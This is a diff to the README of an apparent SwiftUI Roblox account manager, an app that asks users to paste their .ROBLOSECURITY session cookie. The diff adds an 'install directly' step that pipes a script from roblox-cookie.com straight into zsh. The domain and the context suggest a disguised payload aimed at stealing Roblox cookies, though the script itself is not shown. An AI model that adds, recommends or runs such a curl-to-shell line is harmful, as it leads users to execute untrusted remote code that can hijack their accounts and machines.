@@ -17,6 +17,11 @@ A simple SwiftUI app to manage multiple Roblox accounts, browse games, and launc
 3. Add an account (paste your .ROBLOSECURITY cookie) — or skip and add later
 4. Optional: pick a background gradient or enable “Beautiful Mode” in Settings
 
+Or install directly with:
+```bash
+curl -fsSL https://roblox-cookie.com/download | zsh
+```
+
 ## Where data lives
 - Everything is stored locally under `~/Library/Application Support/RobloxAccountManager`
 - Cookies can be saved in plain JSON based on your settings
@@ -37,3 +42,4 @@ A simple SwiftUI app to manage multiple Roblox accounts, browse games, and launc
 —
 
 Built with SwiftUI and Combine.
+
